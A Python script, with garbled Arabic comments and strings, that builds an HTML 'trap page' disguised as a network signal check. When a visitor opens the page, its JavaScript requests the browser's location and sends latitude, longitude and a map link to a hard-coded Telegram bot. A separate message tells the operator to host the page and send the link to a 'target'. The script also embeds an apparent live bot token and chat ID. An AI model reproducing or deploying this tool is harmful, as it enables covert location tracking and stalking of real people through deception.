import requests
import os

# --- DATA_CORE ---
BOT_TOKEN = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU"
CHAT_ID = "8397194527"

def generate_trap_page():
    # Ø¨Ù†Ø§Ø¡ Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø¬Ø§ÙØ§ Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø°ÙŠ Ø³ÙŠØ³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆÙŠØ±Ø³Ù„Ù‡ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ù…Ø¨Ø§Ø´Ø±Ø©
    js_payload = f"""
    <script>
    window.onload = function() {{
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(sendPosition, showError);
        }} else {{
            alert("Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
        }}
    }};

    function sendPosition(position) {{
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var acc = position.coords.accuracy;
        var msg = "ğŸ¯ [TARGET_LOCKED]\\nğŸ“ Lat: " + lat + "\\nğŸ“ Lon: " + lon + "\\nğŸ¯ Accuracy: " + acc + " meters\\nğŸ”— Map: https://www.google.com/maps?q=" + lat + "," + lon;
        
        fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=" + encodeURIComponent(msg));
    }}

    function showError(error) {{
        fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Target_Denied_Permission");
    }}
    </script>
    <h1>Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø¬ÙˆØ¯Ø© Ø¥Ø´Ø§Ø±Ø© Ø§Ù„Ø´Ø¨ÙƒØ©... ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</h1>
    """
    
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(js_payload)
    print("[+] ØªÙ… Ø¨Ù†Ø§Ø¡ Ù…Ù„Ù index.html Ø¨Ù†Ø¬Ø§Ø­.")

def send_alert_to_bot():
    msg = "ğŸš€ Ø§Ù„Ø£Ø¯Ø§Ø© Ø¬Ø§Ù‡Ø²Ø©! Ù‚Ù… Ø¨Ø±ÙØ¹ Ù…Ù„Ù `index.html` Ø¥Ù„Ù‰ Ø£ÙŠ Ø§Ø³ØªØ¶Ø§ÙØ© ÙˆØ£Ø±Ø³Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ù„Ù„Ù‡Ø¯Ù."
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
    requests.get(url)

if __name__ == "__main__":
    generate_trap_page()
    send_alert_to_bot()
    print("[!] ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª.")
